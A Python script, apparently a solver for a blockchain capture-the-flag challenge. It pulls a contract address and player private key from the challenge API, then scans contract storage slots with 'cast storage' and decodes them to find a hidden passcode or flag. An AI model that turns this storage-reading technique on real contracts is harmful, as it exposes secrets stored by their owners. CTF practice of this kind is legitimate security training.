import requests
import subprocess

def decode_hex_string(hex_string):
    try:
        hex_string = hex_string.replace("0x", "").strip()
        decoded = bytes.fromhex(hex_string).decode('utf-8', errors='ignore')
        return decoded
    except Exception:
        return ""

def solve_passcode(task_name, target_ip):
    print(f"\n🔐 [passcode_solver] Solving task '{task_name}' (Target IP: {target_ip})")

    # Step 1: Fetch challenge data from API
    try:
        response = requests.get(f"http://{target_ip}/challenge")
        data = response.json()
        contract_address = data['contract_address']
        private_key = data['player_wallet']['private_key']
        print(f"📥 Smart contract address: {contract_address}")
        print(f"🔑 Private key: {private_key}")
    except Exception as e:
        print(f"[!] Error fetching challenge data: {e}")
        return

    print("\n⌛ Analyzing smart contract storage:")

    for slot in range(20):  # Range of storage slots to scan
        try:
            cmd = [
                "cast", "storage", contract_address, str(slot),
                "--rpc-url", f"http://{target_ip}:8545"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            hex_value = result.stdout.strip()
            decoded = decode_hex_string(hex_value)
            print(f"[slot {slot:02}] {hex_value} --> {decoded}")

            if any(keyword in decoded.lower() for keyword in ["flag", "ctf", "pass"]):
                print(f"\n🎉 Flag found! --> {decoded}")
                break
        except Exception as e:
            print(f"[!] Error reading slot {slot}: {e}")
